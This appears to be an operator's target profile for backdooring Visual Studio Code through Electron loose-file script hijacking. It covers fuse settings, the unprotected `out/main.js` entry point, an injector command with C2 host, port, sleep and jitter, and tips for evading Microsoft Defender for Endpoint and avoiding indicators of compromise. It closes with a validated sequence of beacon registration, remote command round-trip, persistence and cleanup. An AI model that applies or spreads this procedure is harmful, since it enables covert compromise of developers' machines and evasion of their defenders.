# Target profile: Visual Studio Code

**Verified:** 2026-09-23 · VS Code 1.139.0 (user setup) · Electron node
v24.20.0 · DT-MDE-TEST (MDE fully on) · **zero detections**

## Layout (this build is NOT the classic one)

MSIX-flavored user install at `%LOCALAPPDATA%\Programs\Microsoft VS Code\`:
- `Code.exe` lives at the top; the real package content sits in a
  commit-hash subdir (`2242ebbb54\`). Electron resolves
  `process.resourcesPath` to `<hash>\resources` (verified at runtime) —
  always probe resourcesPath, never assume `<exeDir>\resources`.
- **No `app.asar`.** App code is loose files under
  `resources\app\` (`out\`, `node_modules\`, `package.json`, `product.json`);
  only `node_modules.asar` exists (deps archive).

## Fuses: `101100011`

runAsNode=1, cookieEncryption=0, nodeOptionsEnv=1, nodeCliInspect=1,
**embeddedAsarIntegrity=0**, **onlyLoadAppFromAsar=0** → loose-file
script-jack is fully permitted.

## Hook

- Entry: `resources\app\package.json` → `main: ./out/main.js` — **ESM**
  (`import`/`import.meta`; `require` is undefined there — a require()-style
  hook silently no-ops. This is why the injector uses dynamic `import()`).
- Command:
  `inject_unpacked.js --app <hash>\resources --payload <bundle> --name support --target app/out/main.js --host <H> --port <P> --sleep <S> --jitter <J>`
- Payload lands at `<hash>\resources\support.js`; hook resolves via
  `process.resourcesPath`. Delete the injector-written sidecar
  (`support.json`) when the payload carries an encrypted bake (004) —
  plaintext config on disk is an avoidable IoC.

## Integrity check

`product.json` `checksums` covers 10 renderer/workbench files (preload.js,
workbench.desktop.main.js/css, extensionHostProcess.js, workbench.html/js,
sessions.*). **`out\main.js` is NOT covered** — the hook does not trigger
the "[Unsupported]" banner.

## Validated battery

inject → launch (WMI, no args) → register → `pwd` round-trip → normal
process tree (network service, gpu, renderers, node utility procs — no
anomalous children) → kill + relaunch → re-registers (new id, auto) →
`--clean` → zero residue, marker gone, app boots clean, no registration.
